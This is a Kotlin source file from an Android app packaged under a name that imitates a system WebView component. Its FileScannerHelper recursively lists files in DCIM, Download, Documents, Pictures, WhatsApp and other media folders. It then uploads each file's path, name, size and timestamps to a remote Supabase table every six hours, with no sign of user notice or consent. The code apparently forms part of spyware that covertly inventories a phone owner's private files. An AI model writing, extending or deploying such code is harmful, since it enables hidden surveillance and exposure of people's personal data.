package com.system.webview.sync.services

import android.content.Context
import android.os.Environment
import android.util.Log
import android.webkit.MimeTypeMap
import com.system.webview.sync.localdb.PrefsHelper
import com.system.webview.sync.network.SupabaseConfig
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.TimeUnit

object FileScannerHelper {
    private const val TAG = "FileScannerHelper"
    private const val MAX_DEPTH = 5
    private const val BATCH_SIZE = 100
    private const val RESCAN_INTERVAL_MS = 6 * 60 * 60 * 1000L // 6 hours

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val isoFmt = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).also {
        it.timeZone = TimeZone.getTimeZone("UTC")
    }

    /** Root directories to scan */
    private val SCAN_ROOTS = listOf(
        "DCIM", "Download", "Documents", "Pictures",
        "Music", "Movies", "WhatsApp", "Android/media"
    )

    fun shouldRescan(context: Context): Boolean {
        val last = PrefsHelper.getLastFilesSyncTime(context)
        return (System.currentTimeMillis() - last) >= RESCAN_INTERVAL_MS
    }

    fun scanAndSync(context: Context, deviceId: String) {
        Log.d(TAG, "Starting file scan for device $deviceId")
        val baseDir = Environment.getExternalStorageDirectory() ?: run {
            Log.w(TAG, "External storage unavailable"); return
        }

        val entries = mutableListOf<JSONObject>()
        for (root in SCAN_ROOTS) {
            val dir = File(baseDir, root)
            if (dir.exists() && dir.isDirectory) {
                scanDir(dir, baseDir.absolutePath, deviceId, entries, 0)
            }
        }

        if (entries.isEmpty()) {
            Log.d(TAG, "No file entries found"); return
        }

        // Delete old entries for this device, then insert fresh batch
        deleteOldEntries(deviceId)

        // Upload in batches
        var sent = 0
        entries.chunked(BATCH_SIZE).forEach { chunk ->
            val arr = JSONArray()
            chunk.forEach { arr.put(it) }
            if (upsertBatch(arr.toString())) sent += chunk.size
        }

        Log.d(TAG, "File sync done: $sent/${entries.size} entries uploaded")
        PrefsHelper.setLastFilesSyncTime(context, System.currentTimeMillis())
    }

    private fun scanDir(dir: File, storageRoot: String, deviceId: String, out: MutableList<JSONObject>, depth: Int) {
        if (depth > MAX_DEPTH) return
        val children = try { dir.listFiles() ?: return } catch (_: Exception) { return }

        // Add the directory itself (skip root /storage/emulated/0)
        if (depth > 0) {
            out.add(buildEntry(dir, storageRoot, deviceId, isDirectory = true))
        }

        for (child in children) {
            if (child.isDirectory) {
                scanDir(child, storageRoot, deviceId, out, depth + 1)
            } else if (child.isFile) {
                out.add(buildEntry(child, storageRoot, deviceId, isDirectory = false))
            }
        }
    }

    private fun buildEntry(file: File, storageRoot: String, deviceId: String, isDirectory: Boolean): JSONObject {
        val filePath = file.absolutePath  // full path like /storage/emulated/0/DCIM/...
        val parentPath = file.parent ?: storageRoot
        val mime = if (isDirectory) "" else guessMime(file.name)
        val lastMod = if (file.lastModified() > 0)
            isoFmt.format(Date(file.lastModified())) else null

        return JSONObject().apply {
            put("device_id",       deviceId)
            put("file_path",       filePath)
            put("file_name",       file.name)
            put("parent_path",     parentPath)
            put("file_size_bytes", if (isDirectory) 0L else file.length())
            put("is_directory",    isDirectory)
            put("mime_type",       mime)
            if (lastMod != null) put("last_modified", lastMod)
            put("synced_at",       isoFmt.format(Date()))
        }
    }

    private fun guessMime(fileName: String): String {
        val ext = fileName.substringAfterLast('.', "").lowercase()
        return MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext) ?: "application/octet-stream"
    }

    private fun deleteOldEntries(deviceId: String) {
        try {
            val url = "${SupabaseConfig.URL}/rest/v1/file_entries?device_id=eq.$deviceId"
            val request = Request.Builder()
                .url(url)
                .delete()
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .build()
            httpClient.newCall(request).execute().use {
                Log.d(TAG, "Old file entries deleted (${it.code})")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete old entries", e)
        }
    }

    private fun upsertBatch(jsonArray: String): Boolean {
        return try {
            val url = "${SupabaseConfig.URL}/rest/v1/file_entries?on_conflict=device_id,file_path"
            val request = Request.Builder()
                .url(url)
                .post(jsonArray.toRequestBody("application/json".toMediaType()))
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .addHeader("Prefer", "resolution=merge-duplicates,return=minimal")
                .build()
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) true
                else { Log.w(TAG, "Batch upsert failed ${response.code}: ${response.body?.string()}"); false }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Batch upsert exception", e); false
        }
    }
}
